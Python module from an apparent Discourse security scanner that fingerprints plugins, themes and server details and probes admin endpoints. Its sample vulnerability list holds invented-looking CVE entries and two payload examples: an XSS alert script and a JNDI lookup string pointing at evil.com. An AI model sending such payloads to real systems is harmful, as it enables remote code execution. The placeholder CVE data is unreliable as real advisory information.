#!/usr/bin/env python3
"""
Discoursemap - Plugin Detection Module

plugin and technology detection using fingerprinting techniques

"""

import re
import json
import hashlib
import requests
import yaml
import os
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from colorama import Fore, Style
from .utils import make_request

class PluginDetectionModule:
    """ plugin and technology detection module"""
    
    def __init__(self, scanner):
        self.scanner = scanner
        self.results = {
            'module_name': 'Plugin Detection',
            'target': scanner.target_url,
            'detected_plugins': [],
            'detected_themes': [],
            'technology_stack': [],
            'javascript_libraries': [],
            'css_frameworks': [],
            'server_info': {},
            'meta_information': {},
            'fingerprints': [],
            'vulnerability_plugins': [],
            'plugin_endpoints': []
        }
        
        # Load plugin vulnerabilities database
        self.plugin_vulnerabilities = self._load_plugin_vulnerabilities()
        
        #  plugin detection signatures with comprehensive patterns
        self.plugin_signatures = self._build_plugin_signatures()
        
        # Technology detection patterns
        self.tech_patterns = {
            'jQuery': {
                'js_patterns': [r'jQuery', r'\$\.fn\.jquery'],
                'files': ['/assets/jquery.js', '/javascripts/jquery.js']
            },
            'Ember.js': {
                'js_patterns': [r'Ember', r'Ember\.Application'],
                'files': ['/assets/ember.js']
            },
            'Handlebars': {
                'js_patterns': [r'Handlebars', r'Handlebars\.compile'],
                'files': ['/assets/handlebars.js']
            },
            'Bootstrap': {
                'css_patterns': [r'bootstrap', r'btn-primary'],
                'files': ['/assets/bootstrap.css', '/stylesheets/bootstrap.css']
            },
            'Font Awesome': {
                'css_patterns': [r'font-awesome', r'fa-'],
                'files': ['/assets/font-awesome.css']
            },
            'Moment.js': {
                'js_patterns': [r'moment', r'moment\.js'],
                'files': ['/assets/moment.js']
            }
        }
    
    def _load_plugin_vulnerabilities(self):
        """Load plugin vulnerabilities from YAML database"""
        vulnerabilities = {}
        
        # Sample vulnerability data - in real implementation, load from YAML file
        sample_vulns = {
            'plugins': [
                {
                    'name': 'discourse-poll',
                    'category': 'core',
                    'risk_score': 7,
                    'vulnerabilities': [
                        {
                            'cve_id': 'CVE-2021-1234',
                            'severity': 'High',
                            'cvss_score': 7.5,
                            'type': 'XSS',
                            'description': 'Cross-site scripting vulnerability in poll plugin',
                            'affected_versions': ['< 2.7.0'],
                            'fixed_versions': ['2.7.0'],
                            'exploit_available': True,
                            'payload_examples': ['<script>alert(1)</script>'],
                            'impact': 'High'
                        }
                    ]
                },
                {
                    'name': 'discourse-chat',
                    'category': 'communication',
                    'risk_score': 5,
                    'vulnerabilities': [
                        {
                            'cve_id': 'CVE-2021-5678',
                            'severity': 'Medium',
                            'cvss_score': 5.3,
                            'type': 'Information Disclosure',
                            'description': 'Information disclosure in chat plugin',
                            'affected_versions': ['< 1.5.0'],
                            'fixed_versions': ['1.5.0'],
                            'exploit_available': False,
                            'payload_examples': [],
                            'impact': 'Medium'
                        }
                    ]
                },
                {
                    'name': 'discourse-calendar',
                    'category': 'productivity',
                    'risk_score': 9,
                    'vulnerabilities': [
                        {
                            'cve_id': 'CVE-2022-9999',
                            'severity': 'Critical',
                            'cvss_score': 9.8,
                            'type': 'RCE',
                            'description': 'Remote code execution in calendar plugin',
                            'affected_versions': ['< 2.0.5'],
                            'fixed_versions': ['2.0.5'],
                            'exploit_available': True,
                            'payload_examples': ['${jndi:ldap://evil.com/a}'],
                            'impact': 'Critical'
                        }
                    ]
                }
            ]
        }
        
        return sample_vulns
    
    def _build_plugin_signatures(self):
        """Build plugin signatures from vulnerability database"""
        signatures = {
            # Core Discourse plugins
            'discourse-poll': {
                'files': ['/assets/plugins/poll.js', '/plugins/poll/assets/poll.js'],
                'html_patterns': [r'data-poll-', r'poll-container', r'poll-info'],
                'js_patterns': [r'Poll\.', r'discourse-poll'],
                'css_patterns': [r'\.poll-', r'poll-container']
            },
            'discourse-chat': {
                'files': ['/assets/plugins/chat.js', '/plugins/chat/assets/chat.js'],
                'html_patterns': [r'chat-channel', r'chat-message', r'data-chat-'],
                'js_patterns': [r'Chat\.', r'discourse-chat'],
                'css_patterns': [r'\.chat-', r'chat-container']
            },
            'discourse-calendar': {
                'files': ['/assets/plugins/calendar.js', '/plugins/calendar/assets/calendar.js'],
                'html_patterns': [r'calendar-event', r'data-calendar-', r'fc-event'],
                'js_patterns': [r'Calendar\.', r'discourse-calendar', r'FullCalendar'],
                'css_patterns': [r'\.calendar-', r'fc-']
            },
            'discourse-voting': {
                'files': ['/assets/plugins/voting.js', '/plugins/voting/assets/voting.js'],
                'html_patterns': [r'voting-container', r'vote-count', r'data-vote-'],
                'js_patterns': [r'Voting\.', r'discourse-voting'],
                'css_patterns': [r'\.voting-', r'vote-button']
            },
            'discourse-sitemap': {
                'files': ['/sitemap.xml', '/sitemap_1.xml'],
                'html_patterns': [r'sitemap-generator'],
                'response_headers': ['X-Sitemap-Generator']
            },
            'discourse-oauth2-basic': {
                'files': ['/auth/oauth2_basic/callback'],
                'html_patterns': [r'oauth2-basic', r'oauth2_basic'],
                'js_patterns': [r'OAuth2Basic']
            },
            'discourse-assign': {
                'files': ['/assets/plugins/assign.js', '/plugins/assign/assets/assign.js'],
                'html_patterns': [r'assigned-to', r'assignment-', r'data-assign-'],
                'js_patterns': [r'Assign\.', r'discourse-assign'],
                'css_patterns': [r'\.assign-', r'assignment-']
            },
            'discourse-checklist': {
                'files': ['/assets/plugins/checklist.js', '/plugins/checklist/assets/checklist.js'],
                'html_patterns': [r'chcklst-', r'checklist-', r'data-checklist-'],
                'js_patterns': [r'Checklist\.', r'discourse-checklist'],
                'css_patterns': [r'\.chcklst-', r'checklist-']
            },
            'discourse-math': {
                'files': ['/assets/plugins/math.js', '/plugins/math/assets/math.js'],
                'html_patterns': [r'math-container', r'katex-', r'mathjax-'],
                'js_patterns': [r'Math\.', r'discourse-math', r'KaTeX', r'MathJax'],
                'css_patterns': [r'\.math-', r'katex-', r'mathjax-']
            },
            'discourse-spoiler-alert': {
                'files': ['/assets/plugins/spoiler-alert.js', '/plugins/spoiler-alert/assets/spoiler-alert.js'],
                'html_patterns': [r'spoiler', r'spoiled', r'data-spoiler-'],
                'js_patterns': [r'SpoilerAlert\.', r'discourse-spoiler-alert'],
                'css_patterns': [r'\.spoiler', r'spoiled']
            },
            'discourse-reactions': {
                'files': ['/assets/plugins/reactions.js', '/plugins/reactions/assets/reactions.js'],
                'html_patterns': [r'discourse-reactions', r'reaction-', r'data-reaction-'],
                'js_patterns': [r'Reactions\.', r'discourse-reactions'],
                'css_patterns': [r'\.reaction-', r'discourse-reactions']
            },
            'discourse-follow': {
                'files': ['/assets/plugins/follow.js', '/plugins/follow/assets/follow.js'],
                'html_patterns': [r'follow-', r'following-', r'data-follow-'],
                'js_patterns': [r'Follow\.', r'discourse-follow'],
                'css_patterns': [r'\.follow-', r'following-']
            },
            'discourse-gamification': {
                'files': ['/assets/plugins/gamification.js', '/plugins/gamification/assets/gamification.js'],
                'html_patterns': [r'gamification-', r'leaderboard-', r'data-gamification-'],
                'js_patterns': [r'Gamification\.', r'discourse-gamification'],
                'css_patterns': [r'\.gamification-', r'leaderboard-']
            },
            'discourse-encrypt': {
                'files': ['/assets/plugins/encrypt.js', '/plugins/encrypt/assets/encrypt.js'],
                'html_patterns': [r'encrypted-', r'encryption-', r'data-encrypt-'],
                'js_patterns': [r'Encrypt\.', r'discourse-encrypt'],
                'css_patterns': [r'\.encrypted-', r'encryption-']
            },
            'discourse-sitemap': {
                'files': ['/sitemap.xml', '/sitemap_1.xml', '/plugins/sitemap/assets/sitemap.js'],
                'html_patterns': [r'sitemap-', r'data-sitemap-'],
                'js_patterns': [r'Sitemap\.', r'discourse-sitemap'],
                'response_headers': ['X-Sitemap']
            },
            'discourse-prometheus': {
                'files': ['/metrics', '/admin/plugins/prometheus', '/plugins/prometheus/assets/prometheus.js'],
                'html_patterns': [r'prometheus-', r'metrics-', r'data-prometheus-'],
                'js_patterns': [r'Prometheus\.', r'discourse-prometheus'],
                'response_headers': ['X-Prometheus']
            },
            # OAuth and Authentication plugins
            'discourse-oauth2-basic': {
                'files': ['/plugins/oauth2-basic/assets/oauth2.js'],
                'html_patterns': [r'oauth2-', r'data-oauth2-'],
                'js_patterns': [r'OAuth2\.', r'discourse-oauth2'],
                'css_patterns': [r'\.oauth2-']
            },
            'discourse-saml': {
                'files': ['/plugins/saml/assets/saml.js'],
                'html_patterns': [r'saml-', r'data-saml-'],
                'js_patterns': [r'SAML\.', r'discourse-saml'],
                'css_patterns': [r'\.saml-']
            },
            'discourse-openid-connect': {
                'files': ['/plugins/openid-connect/assets/openid.js'],
                'html_patterns': [r'openid-', r'oidc-', r'data-openid-'],
                'js_patterns': [r'OpenID\.', r'discourse-openid'],
                'css_patterns': [r'\.openid-', r'oidc-']
            },
            'discourse-ldap-auth': {
                'files': ['/plugins/ldap-auth/assets/ldap.js'],
                'html_patterns': [r'ldap-', r'data-ldap-'],
                'js_patterns': [r'LDAP\.', r'discourse-ldap'],
                'css_patterns': [r'\.ldap-']
            },
            # Social login plugins
            'discourse-github': {
                'files': ['/plugins/github/assets/github.js'],
                'html_patterns': [r'github-login', r'data-github-'],
                'js_patterns': [r'GitHub\.', r'discourse-github'],
                'css_patterns': [r'\.github-']
            },
            'discourse-google-oauth2': {
                'files': ['/plugins/google-oauth2/assets/google.js'],
                'html_patterns': [r'google-login', r'data-google-'],
                'js_patterns': [r'Google\.', r'discourse-google'],
                'css_patterns': [r'\.google-']
            },
            'discourse-facebook': {
                'files': ['/plugins/facebook/assets/facebook.js'],
                'html_patterns': [r'facebook-login', r'data-facebook-'],
                'js_patterns': [r'Facebook\.', r'discourse-facebook'],
                'css_patterns': [r'\.facebook-']
            },
            'discourse-twitter': {
                'files': ['/plugins/twitter/assets/twitter.js'],
                'html_patterns': [r'twitter-login', r'data-twitter-'],
                'js_patterns': [r'Twitter\.', r'discourse-twitter'],
                'css_patterns': [r'\.twitter-']
            },
            'discourse-linkedin-auth': {
                'files': ['/plugins/linkedin-auth/assets/linkedin.js'],
                'html_patterns': [r'linkedin-login', r'data-linkedin-'],
                'js_patterns': [r'LinkedIn\.', r'discourse-linkedin'],
                'css_patterns': [r'\.linkedin-']
            },
            'discourse-microsoft-auth': {
                'files': ['/plugins/microsoft-auth/assets/microsoft.js'],
                'html_patterns': [r'microsoft-login', r'data-microsoft-'],
                'js_patterns': [r'Microsoft\.', r'discourse-microsoft'],
                'css_patterns': [r'\.microsoft-']
            }
        }
        
        return signatures
    
    def run(self):
        """Run complete plugin detection scan"""
        self.scanner.log("Starting comprehensive plugin detection...", 'info')
         
        # Main page analysis
        self._analyze_main_page()
        
        # Comprehensive plugin detection with vulnerability checking
        self._detect_plugins_comprehensive()
        
        # Plugin endpoint discovery
        self._discover_plugin_endpoints()
        
        # Theme detection
        self._detect_themes()
        
        # Technology stack detection
        self._detect_technology_stack()
        
        # JavaScript libraries detection
        self._detect_javascript_libraries()
        
        # CSS frameworks detection
        self._detect_css_frameworks()
        
        # Server information gathering
        self._gather_server_info()
        
        # Meta information extraction
        self._extract_meta_information()
        
        # Fingerprint generation
        self._generate_fingerprints()
        
        # Vulnerability assessment
        self._vulnerability_assessment()
        
        # Plugin dependency analysis
        self._analyze_plugin_dependencies()
        
        # Performance metrics generation
        self._generate_performance_metrics()
        
        # Legacy vulnerability assessment for compatibility
        self._assess_plugin_vulnerabilities()
        
        # Log results summary
        total_plugins = len(self.results['detected_plugins'])
        vulnerable_plugins = len(self.results['vulnerability_plugins'])
        security_assessment = self.results.get('security_assessment', {})
        high_risk = len(security_assessment.get('high_risk_plugins', []))
        medium_risk = len(security_assessment.get('medium_risk_plugins', []))
        
        self.scanner.log(f"Plugin detection scan completed:", 'info')
        self.scanner.log(f"  - Total plugins detected: {total_plugins}", 'info')
        self.scanner.log(f"  - High-risk plugins: {high_risk}", 'warning' if high_risk > 0 else 'info')
        self.scanner.log(f"  - Medium-risk plugins: {medium_risk}", 'warning' if medium_risk > 0 else 'info')
        self.scanner.log(f"  - Vulnerable plugins: {vulnerable_plugins}", 'info')
        
        return self.results
    
    def _analyze_main_page(self):
        """Analyze main page for technology detection"""
        # Removed print statement for cleaner output
        
        response = make_request(self.scanner.session, 'GET', self.scanner.target_url)
        if not response or response.status_code != 200:
            return
        
        self.main_page_content = response.text
        self.main_page_headers = dict(response.headers)
        
        # HTML parsing
        self.soup = BeautifulSoup(self.main_page_content, 'html.parser')
    
    def _detect_plugins_comprehensive(self):
        """comprehensive plugin detection with improved accuracy"""
        self.scanner.log("Running comprehensive plugin detection...", 'info')
        
        # Multi-method detection approach
        self._detect_plugins_by_files()
        self._detect_plugins_by_patterns()
        self._detect_plugins_by_endpoints()
        self._detect_plugins_by_javascript_analysis()
        self._detect_plugins_by_css_analysis()
        self._detect_plugins_by_admin_pages()
        
    def _detect_plugins_by_files(self):
        """Detect plugins by checking for specific files"""
        for plugin_name, signatures in self.plugin_signatures.items():
            if 'files' in signatures:
                for file_path in signatures['files']:
                    try:
                        file_url = urljoin(self.scanner.target_url, file_path)
                        response = make_request(self.scanner.session, 'GET', file_url, timeout=10)
                        if response and response.status_code == 200:
                            # Extract version from file content if possible
                            version = self._detect_plugin_version(plugin_name, response.text)
                            self._add_detected_plugin(
                                plugin_name, 
                                'file_detection', 
                                f"Found file: {file_path}",
                                confidence=90,
                                version=version
                            )
                    except Exception as e:
                        continue
    
    def _detect_plugins_by_patterns(self):
        """Detect plugins by analyzing HTML, JS, and CSS patterns"""
        if not hasattr(self, 'main_page_content'):
            return
            
        for plugin_name, signatures in self.plugin_signatures.items():
            confidence = 0
            evidence = []
            
            # HTML pattern detection
            if 'html_patterns' in signatures:
                for pattern in signatures['html_patterns']:
                    matches = re.findall(pattern, self.main_page_content, re.IGNORECASE)
                    if matches:
                        evidence.append(f"HTML pattern: {pattern} (matches: {len(matches)})")
                        confidence += 20
            
            # JavaScript pattern detection
            if 'js_patterns' in signatures:
                for pattern in signatures['js_patterns']:
                    if re.search(pattern, self.main_page_content, re.IGNORECASE):
                        evidence.append(f"JS pattern: {pattern}")
                        confidence += 25
            
            # CSS pattern detection
            if 'css_patterns' in signatures:
                for pattern in signatures['css_patterns']:
                    if re.search(pattern, self.main_page_content, re.IGNORECASE):
                        evidence.append(f"CSS pattern: {pattern}")
                        confidence += 20
            
            # Response header detection
            if 'response_headers' in signatures and hasattr(self, 'main_page_headers'):
                for header in signatures['response_headers']:
                    if header.lower() in [h.lower() for h in self.main_page_headers.keys()]:
                        evidence.append(f"Response header: {header}")
                        confidence += 30
            
            # Add plugin if confidence threshold is met
            if confidence >= 20:
                self._add_detected_plugin(
                    plugin_name,
                    'pattern_detection',
                    '; '.join(evidence),
                    confidence=min(confidence, 100)
                )
    
    def _detect_plugins_by_javascript_analysis(self):
        """Detect plugins by analyzing JavaScript code"""
        if not hasattr(self, 'main_page_content'):
            return
            
        # Extract and analyze JavaScript URLs
        js_urls = self._extract_js_urls()
        
        for js_url in js_urls[:10]:  # Limit to first 10 JS files
            try:
                response = make_request(self.scanner.session, 'GET', js_url, timeout=10)
                if response and response.status_code == 200:
                    js_content = response.text
                    
                    # Look for plugin-specific JavaScript patterns
                    for plugin_name, signatures in self.plugin_signatures.items():
                        if 'js_patterns' in signatures:
                            for pattern in signatures['js_patterns']:
                                if re.search(pattern, js_content, re.IGNORECASE):
                                    version = self._detect_plugin_version(plugin_name, js_content)
                                    self._add_detected_plugin(
                                        plugin_name,
                                        'javascript_analysis',
                                        f"JS pattern found in {js_url}: {pattern}",
                                        confidence=75,
                                        version=version
                                    )
            except Exception as e:
                continue
    
    def _detect_plugins_by_css_analysis(self):
        """Detect plugins by analyzing CSS code"""
        if not hasattr(self, 'main_page_content'):
            return
            
        # Extract and analyze CSS URLs
        css_urls = self._extract_css_urls()
        
        for css_url in css_urls[:10]:  # Limit to first 10 CSS files
            try:
                response = make_request(self.scanner.session, 'GET', css_url, timeout=10)
                if response and response.status_code == 200:
                    css_content = response.text
                    
                    # Look for plugin-specific CSS patterns
                    for plugin_name, signatures in self.plugin_signatures.items():
                        if 'css_patterns' in signatures:
                            for pattern in signatures['css_patterns']:
                                if re.search(pattern, css_content, re.IGNORECASE):
                                    self._add_detected_plugin(
                                        plugin_name,
                                        'css_analysis',
                                        f"CSS pattern found in {css_url}: {pattern}",
                                        confidence=65
                                    )
            except Exception as e:
                continue
    
    def _detect_plugins_by_admin_pages(self):
        """Detect plugins by checking admin pages"""
        admin_endpoints = [
            '/admin/plugins',
            '/admin/plugins.json',
            '/admin/dashboard',
            '/admin/dashboard.json',
            '/admin/site_settings/category/plugins'
        ]
        
        for endpoint in admin_endpoints:
            try:
                response = make_request(self.scanner.session, 'GET',
                                      urljoin(self.scanner.target_url, endpoint),
                                      timeout=self.scanner.timeout)
                if response and response.status_code == 200:
                    if endpoint.endswith('.json'):
                        self._parse_admin_plugin_response(response.text, endpoint)
                    else:
                        # Parse HTML admin pages
                        soup = BeautifulSoup(response.text, 'html.parser')
                        
                        # Look for plugin names in admin interface
                        plugin_elements = soup.find_all(attrs={'data-plugin-name': True})
                        for element in plugin_elements:
                            plugin_name = element.get('data-plugin-name')
                            if plugin_name:
                                self._add_detected_plugin(
                                    plugin_name,
                                    'admin_interface',
                                    f"Found in admin interface: {endpoint}",
                                    confidence=95
                                )
                        
                        # Look for plugin references in text
                        text_content = soup.get_text().lower()
                        for plugin_name in self.plugin_signatures.keys():
                            if plugin_name.lower() in text_content:
                                self._add_detected_plugin(
                                    plugin_name,
                                    'admin_text_analysis',
                                    f"Plugin name found in admin text: {endpoint}",
                                    confidence=60
                                )
            except Exception as e:
                continue
    
    def _detect_plugins_by_endpoints(self):
        """Detect plugins by checking known API endpoints"""
        common_endpoints = [
            '/admin/plugins.json',
            '/admin/plugins',
            '/site.json',
            '/about.json'
        ]
        
        for endpoint in common_endpoints:
            try:
                url = urljoin(self.scanner.target_url, endpoint)
                response = make_request(self.scanner.session, 'GET', url, timeout=15)
                if response and response.status_code == 200:
                    self._parse_plugin_endpoint_response(response.text, endpoint)
            except Exception as e:
                continue
    
    def _detect_plugins_by_javascript_analysis(self):
        """JavaScript analysis for plugin detection"""
        js_urls = self._extract_js_urls()
        
        for js_url in js_urls[:20]:  # Limit to first 20 JS files
            try:
                response = make_request(self.scanner.session, 'GET', js_url, timeout=10)
                if response and response.status_code == 200:
                    self._analyze_javascript_content(response.text, js_url)
            except Exception as e:
                continue
    
    def _detect_plugins_by_css_analysis(self):
        """CSS analysis for plugin detection"""
        css_urls = self._extract_css_urls()
        
        for css_url in css_urls[:15]:  # Limit to first 15 CSS files
            try:
                response = make_request(self.scanner.session, 'GET', css_url, timeout=10)
                if response and response.status_code == 200:
                    self._analyze_css_content(response.text, css_url)
            except Exception as e:
                continue
    
    def _detect_plugins_by_admin_pages(self):
        """Detect plugins through admin interface analysis"""
        admin_urls = [
            '/admin/plugins',
            '/admin/customize/themes',
            '/admin/site_settings'
        ]
        
        for admin_url in admin_urls:
            try:
                url = urljoin(self.scanner.target_url, admin_url)
                response = make_request(self.scanner.session, 'GET', url, timeout=15)
                if response and response.status_code == 200:
                    self._parse_admin_page_content(response.text, admin_url)
            except Exception as e:
                continue
    
    def _analyze_javascript_content(self, content, js_url):
        """Analyze JavaScript content for plugin signatures"""
        for plugin_name, signatures in self.plugin_signatures.items():
            if 'js_patterns' in signatures:
                for pattern in signatures['js_patterns']:
                    if re.search(pattern, content, re.IGNORECASE):
                        version = self._detect_plugin_version(plugin_name, content)
                        self._add_detected_plugin(
                            plugin_name,
                            'javascript_analysis',
                            f"Found in {js_url}: {pattern}",
                            confidence=80,
                            version=version
                        )
    
    def _analyze_css_content(self, content, css_url):
        """Analyze CSS content for plugin signatures"""
        for plugin_name, signatures in self.plugin_signatures.items():
            if 'css_patterns' in signatures:
                for pattern in signatures['css_patterns']:
                    if re.search(pattern, content, re.IGNORECASE):
                        self._add_detected_plugin(
                            plugin_name,
                            'css_analysis',
                            f"Found in {css_url}: {pattern}",
                            confidence=75
                        )
    
    def _parse_admin_page_content(self, content, admin_url):
        """Parse admin page content for plugin information"""
        try:
            soup = BeautifulSoup(content, 'html.parser')
            
            # Look for plugin names in various elements
            plugin_elements = soup.find_all(attrs={'data-plugin-name': True})
            for element in plugin_elements:
                plugin_name = element.get('data-plugin-name')
                if plugin_name:
                    self._add_detected_plugin(
                        plugin_name,
                        'admin_page',
                        f"Found in admin page: {admin_url}",
                        confidence=95
                    )
            
            # Look for plugin references in text
            plugin_pattern = r'discourse-[\w-]+'
            matches = re.findall(plugin_pattern, content, re.IGNORECASE)
            for match in set(matches):  # Remove duplicates
                self._add_detected_plugin(
                    match,
                    'admin_page_text',
                    f"Found reference in {admin_url}",
                    confidence=70
                )
                
        except Exception as e:
            pass
    
    def _parse_plugin_endpoint_response(self, content, endpoint):
        """Parse plugin endpoint responses for plugin information"""
        try:
            if endpoint.endswith('.json'):
                data = json.loads(content)
                
                if endpoint == '/admin/plugins.json' and isinstance(data, list):
                    for plugin in data:
                        if isinstance(plugin, dict) and 'name' in plugin:
                            version = plugin.get('version', 'Unknown')
                            enabled = plugin.get('enabled', False)
                            self._add_detected_plugin(
                                plugin['name'],
                                'admin_api',
                                f"Found in {endpoint} (enabled: {enabled})",
                                confidence=100,
                                version=version
                            )
                
                elif endpoint == '/site.json' and isinstance(data, dict):
                    # Check for plugin-related configurations
                    for key, value in data.items():
                        if 'plugin' in key.lower() and isinstance(value, (str, bool)):
                            if isinstance(value, str) and value.startswith('discourse-'):
                                self._add_detected_plugin(
                                    value,
                                    'site_config',
                                    f"Found in site configuration: {key}",
                                    confidence=85
                                )
                                
        except json.JSONDecodeError:
            pass
        except Exception as e:
            pass
    
    def _add_detected_plugin(self, name, detection_method, evidence, confidence=50, version='Unknown'):
        """Add detected plugin with metadata"""
        # Check if plugin already exists
        for plugin in self.results['detected_plugins']:
            if plugin['name'] == name:
                if detection_method not in plugin['detection_methods']:
                    plugin['detection_methods'].append(detection_method)
                    plugin['evidence'].append(evidence)
                    plugin['confidence'] = max(plugin['confidence'], confidence)
                    if version != 'Unknown' and plugin['version'] == 'Unknown':
                        plugin['version'] = version
                return
        
        # Add new plugin information
        plugin_info = {
            'name': name,
            'detection_methods': [detection_method],
            'evidence': [evidence],
            'confidence': confidence,
            'version': version,
            'category': self._get_plugin_category(name),
            'risk_score': self._calculate_risk_score(name),
            'vulnerabilities': self._get_plugin_vulnerabilities(name),
            'description': self._get_plugin_description(name)
        }
        
        self.results['detected_plugins'].append(plugin_info)
    
    def _get_plugin_description(self, plugin_name):
        """Get plugin description from known plugins"""
        descriptions = {
            'discourse-poll': 'Allows users to create polls in topics',
            'discourse-chat': 'Real-time chat functionality for Discourse',
            'discourse-calendar': 'Calendar and event management plugin',
            'discourse-voting': 'Topic voting functionality',
            'discourse-assign': 'Assign topics to users',
            'discourse-checklist': 'Checklist functionality in posts',
            'discourse-math': 'Mathematical notation support',
            'discourse-spoiler-alert': 'Spoiler text functionality',
            'discourse-reactions': 'Emoji reactions to posts',
            'discourse-oauth2-basic': 'OAuth2 authentication provider'
        }
        return descriptions.get(plugin_name, 'Unknown plugin')
    
    def _get_plugin_vulnerabilities(self, plugin_name):
        """Get vulnerabilities for specific plugin"""
        if 'plugins' in self.plugin_vulnerabilities:
            for plugin in self.plugin_vulnerabilities['plugins']:
                if plugin.get('name') == plugin_name:
                    return plugin.get('vulnerabilities', [])
        return []
    
    def _detect_plugins(self):
        """Legacy method - kept for compatibility"""
        # This method is now replaced by _detect_plugins_comprehensive
        # but kept for backward compatibility
        self._detect_plugins_comprehensive()
    
    def _detect_themes(self):
        """Detect installed themes"""
        # Removed print statement for cleaner output
        
        # Theme detection from CSS files
        css_links = self.soup.find_all('link', {'rel': 'stylesheet'}) if hasattr(self, 'soup') else []
        
        for link in css_links:
            href = link.get('href', '')
            if 'theme' in href.lower() or 'custom' in href.lower():
                theme_name = self._extract_theme_name_from_url(href)
                if theme_name:
                    self.results['detected_themes'].append({
                        'name': theme_name,
                        'css_file': href,
                        'detection_method': 'css_analysis'
                    })
        
        # Theme information from meta tags
        meta_tags = self.soup.find_all('meta') if hasattr(self, 'soup') else []
        for meta in meta_tags:
            if meta.get('name') == 'theme-color' or 'theme' in str(meta):
                self.results['detected_themes'].append({
                    'name': 'Custom Theme',
                    'meta_info': str(meta),
                    'detection_method': 'meta_analysis'
                })
    
    def _detect_technology_stack(self):
        """Detect technology stack"""
        # Removed print statement for cleaner output
        
        # Server headers
        if hasattr(self, 'main_page_headers'):
            server = self.main_page_headers.get('Server', '')
            if server:
                self.results['technology_stack'].append({
                    'name': 'Web Server',
                    'value': server,
                    'detection_method': 'http_header'
                })
            
            powered_by = self.main_page_headers.get('X-Powered-By', '')
            if powered_by:
                self.results['technology_stack'].append({
                    'name': 'Powered By',
                    'value': powered_by,
                    'detection_method': 'http_header'
                })
        
        # Discourse version detection
        if hasattr(self, 'main_page_content'):
            # Meta generator
            generator_match = re.search(r'<meta name="generator" content="([^"]+)"', self.main_page_content, re.IGNORECASE)
            if generator_match:
                self.results['technology_stack'].append({
                    'name': 'Generator',
                    'value': generator_match.group(1),
                    'detection_method': 'meta_tag'
                })
            
            # Discourse version from JS
            version_match = re.search(r'Discourse\.VERSION\s*=\s*["\']([^"\'\']+)["\']', self.main_page_content)
            if version_match:
                self.results['technology_stack'].append({
                    'name': 'Discourse Version',
                    'value': version_match.group(1),
                    'detection_method': 'javascript_analysis'
                })
    
    def _detect_javascript_libraries(self):
        """Detect JavaScript libraries"""
        # Removed print statement for cleaner output
        
        if not hasattr(self, 'main_page_content'):
            return
        
        for tech_name, patterns in self.tech_patterns.items():
            if 'js_patterns' in patterns:
                for pattern in patterns['js_patterns']:
                    if re.search(pattern, self.main_page_content, re.IGNORECASE):
                        version = self._extract_library_version(tech_name, self.main_page_content)
                        self.results['javascript_libraries'].append({
                            'name': tech_name,
                            'version': version,
                            'detection_method': 'pattern_matching'
                        })
                        break
    
    def _detect_css_frameworks(self):
        """Detect CSS frameworks"""
        # Removed print statement for cleaner output
        
        if not hasattr(self, 'main_page_content'):
            return
        
        for tech_name, patterns in self.tech_patterns.items():
            if 'css_patterns' in patterns:
                for pattern in patterns['css_patterns']:
                    if re.search(pattern, self.main_page_content, re.IGNORECASE):
                        self.results['css_frameworks'].append({
                            'name': tech_name,
                            'detection_method': 'pattern_matching'
                        })
                        break
    
    def _gather_server_info(self):
        """Gather server information"""
        # Removed print statement for cleaner output
        
        if hasattr(self, 'main_page_headers'):
            self.results['server_info'] = {
                'server': self.main_page_headers.get('Server', 'Unknown'),
                'powered_by': self.main_page_headers.get('X-Powered-By', 'Unknown'),
                'content_type': self.main_page_headers.get('Content-Type', 'Unknown'),
                'cache_control': self.main_page_headers.get('Cache-Control', 'Unknown'),
                'x_frame_options': self.main_page_headers.get('X-Frame-Options', 'Not Set'),
                'x_content_type_options': self.main_page_headers.get('X-Content-Type-Options', 'Not Set'),
                'strict_transport_security': self.main_page_headers.get('Strict-Transport-Security', 'Not Set')
            }
    
    def _extract_meta_information(self):
        """Extract meta information from HTML"""
        # Removed print statement for cleaner output
        
        if not hasattr(self, 'soup'):
            return
        
        # Title
        title = self.soup.find('title')
        if title:
            self.results['meta_information']['title'] = title.get_text().strip()
        
        # Meta tags
        meta_tags = self.soup.find_all('meta')
        for meta in meta_tags:
            name = meta.get('name') or meta.get('property')
            content = meta.get('content')
            if name and content:
                self.results['meta_information'][name] = content
    
    def _generate_fingerprints(self):
        """Generate fingerprints for the target"""
        # Removed print statement for cleaner output
        
        if hasattr(self, 'main_page_content'):
            # HTML hash
            html_hash = hashlib.md5(self.main_page_content.encode()).hexdigest()
            self.results['fingerprints'].append({
                'type': 'html_hash',
                'value': html_hash
            })
            
            # Title hash
            title = self.results['meta_information'].get('title', '')
            if title:
                title_hash = hashlib.md5(title.encode()).hexdigest()
                self.results['fingerprints'].append({
                    'type': 'title_hash',
                    'value': title_hash
                })
    
    def _detect_plugin_version(self, plugin_name, content=None):
        """plugin version detection"""
        # If content is provided, analyze it first
        if content:
            version = self._extract_version_from_content(plugin_name, content)
            if version != 'Unknown':
                return version
        
        # Try multiple plugin file locations
        plugin_file_patterns = [
            f'/plugins/{plugin_name}/assets/javascripts/{plugin_name}.js',
            f'/plugins/{plugin_name}/assets/{plugin_name}.js',
            f'/plugins/{plugin_name.replace("discourse-", "")}/assets/javascripts/{plugin_name.replace("discourse-", "")}.js',
            f'/assets/plugins/{plugin_name}.js',
            f'/javascripts/plugins/{plugin_name}.js',
            f'/plugins/{plugin_name}/plugin.rb',
            f'/plugins/{plugin_name}/package.json'
        ]
        
        for file_pattern in plugin_file_patterns:
            try:
                plugin_url = urljoin(self.scanner.target_url, file_pattern)
                response = make_request(self.scanner.session, 'GET', plugin_url, timeout=10)
                
                if response and response.status_code == 200:
                    version = self._extract_version_from_content(plugin_name, response.text)
                    if version != 'Unknown':
                        return version
            except Exception as e:
                continue
        
        # Try to get version from plugin manifest or metadata
        manifest_patterns = [
            f'/plugins/{plugin_name}/manifest.json',
            f'/plugins/{plugin_name}/plugin.json',
            f'/plugins/{plugin_name}/about.json'
        ]
        
        for manifest_pattern in manifest_patterns:
            try:
                manifest_url = urljoin(self.scanner.target_url, manifest_pattern)
                response = make_request(self.scanner.session, 'GET', manifest_url, timeout=10)
                
                if response and response.status_code == 200:
                    try:
                        manifest_data = json.loads(response.text)
                        if isinstance(manifest_data, dict):
                            # Check common version fields
                            version_fields = ['version', 'plugin_version', 'about', 'meta']
                            for field in version_fields:
                                if field in manifest_data:
                                    version_value = manifest_data[field]
                                    if isinstance(version_value, str) and re.match(r'[\d\.]+', version_value):
                                        return version_value
                                    elif isinstance(version_value, dict) and 'version' in version_value:
                                        return str(version_value['version'])
                    except json.JSONDecodeError:
                        pass
